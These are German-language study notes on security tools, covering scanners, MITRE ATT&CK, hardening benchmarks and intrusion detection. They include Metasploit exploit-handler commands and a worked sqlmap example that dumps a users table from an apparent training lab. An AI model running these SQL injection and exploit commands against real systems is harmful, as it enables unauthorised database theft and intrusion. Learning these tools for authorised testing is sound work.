## [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)
- Vulnerability Scanner
- Detection von Vulnerabilities
- Simliert Angriffe auf gewisse Vulnerabilities
- Führt Netzwerkscans aus
- Scannt nach Misconfigurations, Open Ports, DDOS Vulnerability, Passwords

### Installation
- [Download](https://www.tenable.com/downloads?loginAttempted=true)
- Zugriff auf localhost: https://localhost:8834/

## [#Metasploit](https://www.section.io/engineering-education/getting-started-with-metasploit-framework/)
- Penetration Testing
- Network Scanning 
- Zugriff auf Kommandozeile: `msfconsole`
	- Muss in PATH sein

### Syntax
1. Passendes Modul suchen:
```
search type:exploit platform:windows multi/handler
```

2. Modul benutzen
```
use exploit/multi/handler
```

3. Informationen über Modul herausfinden
```
info
```

4. Optionen anzeigen was definiert werden muss
```
show
```

5. Optionen setzen (bspw.)
```
set LHOST 10.10.10.10
```

6. Exploit duchführen
```
exploit
```

- Einen Schritt zurückgehen
```
back
```

- Metasploit verlassen
```
exit
```

## [#MITRE](https://attack.mitre.org/)
- MITRE Adversarial Tactics, Techniques & Common Knowlegde
- Framework um Angriffstaktiken und Techniken einzuordnen
- Enterprise
	- Angriff auf Unternehmen
	- Netzwerke / Windows / MacOS / Linux
- Mobile
	- Angriffe auf iOS / Android
- Taktiken Beispiele:
	- Persistence
	- Defense Evasion
	- Exfiltration
	- Impacts
	- Initial Access
- Techniken Beispiele:
	- Boot or Logon Autostart Execution
	- Registry Run Keys / Startup Folder
	- Authentication Package
- Technik beinhaltet: Taktik / Beschreibung / Malware (Procedure) / Mitigation / Detektion
- Beispiel: Angreifer möchte #DDOS Angriff starten
	- Tactics: Impact
	- Techniques: DDOS
	- Procedure: Mirai

## #CIS-Benchmark
- Center for Internet Security
- Hardening Guide / Best Practice wie ein System konfiguriert wird
- Tool für Audits
- Scored: Wichtig / Gibt Abzug wenn nicht erfüllt
- Not Scored: Empfehlungen
- Bewertet:
	- Filesystem
	- Updates
	- Sicherer Boot-Vorgang
	- Services
	- Netzwerk-Konfiguration
	- Audit ist installiert
- Tool auditd
	- Audittrail / Logbuch für jede Aktion auf dem Server erstellen
	- Grundlage für Angriff-Detektion

### [HardeningKitty](https://github.com/scipag/HardeningKitty)
- Alternativer Hardening Guide
- CIS-Benchmark ist Teil davon
- Checkt:
	- Powershell
	- Local Policies

## [#AIDE](https://www.redhat.com/sysadmin/linux-security-aide)
- Advanced Intrusion Detection Environment
- Intrusion Detection Tool für Linux
	- Log Analyse
	- Malware Detecion
	- Rootkit-Detection
	- System Inventory
	- File Integrity Monitoring

## [#OSSEC](https://www.ossec.net/)
- All-In-One Lösung für Server Intrusion Detection

### Aufbau
![[CleanShot 2022-08-22 at 19.17.09.png]]

### Ablauf
- Beinhaltet verschiedenen Datenquellen:
	- syscheck (Inegritätscheck, Vergleicht Hashes, Bemerkt so Veränderungen)
	- rootcheck (Sucht nach Rootkits)
- Datenquellen werden auf Server normalisiert und anschliessend Regeln angewendet
	- log_format unterstützt verschiedenen Standard Logs (Syslog, Snort, Eventlog)
	- Falls unbekanntes Format muss ein Decoder geschrieben werden

![[CleanShot 2022-08-22 at 19.27.27.png]]

- Anschliessend können die Ausgelösten Alerts weiterverarbeitet (Logstash) und mit auf einem WebGUI durchsuchbar gemacht werden (ElasticSearch, Kibana) > ELK Stack

## [Virustotal](https://www.virustotal.com/gui/home/upload)
- Online Antivirenscanner mit vielen bekannten Scannern

## [sqlmap](https://www.geeksforgeeks.org/use-sqlmap-test-website-sql-injection-vulnerability/)
- #SQLi Penetration Testing Tool
- Zugriff auf Kommandozeile: `sqlmap.py`
	- Muss in PATH sein
- Mit `sql-query` [SQL-Requests](https://i-am-takuma.medium.com/sqlmap-cheat-sheet-8dc29054528c) durchführen

### Syntax
- Alles (DBs / Tabellen) auf Website anzeigen(dauert lange):
```
sqlmap.py -u [GET-URL] -a
```

- Alle Daten von einer Tabelle anzeigen:
```
sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] --dump
```

- DBs auf Website anzeigen:
```
sqlmap.py -u [GET-URL] --dbs
```

- Tabellen von bestimmter DB anzeigen:
```
sqlmap.py -u [URL mit GET] -D [Databasename] --tables
```

- Spalten von bestimmter Tabelle anzeigen:
```
sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] --columns
```

- Daten von bestimmter Spalten anzeigen:
```
sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] -C [Columname] --dump
```

### Beispiel
1. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann --dbs
```

![[CleanShot 2022-09-07 at 11.17.29.png]]

2. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel --tables
```

![[CleanShot 2022-09-07 at 11.21.10.png]]

3. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users --columns
```

![[CleanShot 2022-09-07 at 11.28.57.png]]

4. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users -C emails --dump
```

![[CleanShot 2022-09-07 at 11.42.15.png]]

5. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users --dump
```

![[CleanShot 2022-09-07 at 12.00.18.png]]

## [hydra](https://techyrick.com/hydra-full-tutorial/)
- Passwort Cracker
- Nativ in Kali

## fail2ban
- Intrusion Prevention Tool
- Analyisiert Logfiles
- Blockiert IP bei definierter Anzahl Versuche in gewisser Zeitspanne